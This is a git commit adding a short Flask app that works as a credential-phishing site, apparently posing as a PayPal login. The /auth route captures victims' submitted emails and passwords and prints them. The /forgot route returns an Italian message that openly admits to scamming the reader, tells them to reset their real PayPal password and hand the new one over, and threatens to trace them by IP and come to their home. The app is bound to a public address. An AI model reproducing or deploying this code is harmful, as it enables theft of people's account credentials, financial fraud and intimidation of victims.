c570167bbf6e438b997b71af057a515153a86a2e
GitAndre2012 <142157416+GitAndre2012@users.noreply.github.com>
2023-08-13 19:55:00 +0200

    Add files via upload

---
+++ app.py
@@ -0,0 +1,22 @@
+from flask import Flask, request, render_template
+
+app = Flask(__name__)
+
+@app.route("/auth", methods=['POST'])
+def auth ():
+    dati = {"email": request.form["email"], "password": request.form["pass"]}
+    print(dati)
+    return render_template("ok.html")
+
+@app.route("/")
+def index ():
+    return render_template("login.html")
+
+@app.route("/forgot")
+def forgot ():
+    return "Non puoi così dal nulla impedirmi di truffarti, addesso apri il sito di PayPal vero fai \"Accedi\" e dopo fai \"Password dimenticata?\". Alla fine torni su questo sito e mi dai i tuoi dati. E non fare il furbo chiudendo il sito tanto ti vengo a cercare a casa perchè ho il tuo ip e ti posso tracciare. D'accordo?"
+
+if __name__ == "__main__":
+    app.run(host="185.85.154.83")
+
+input()
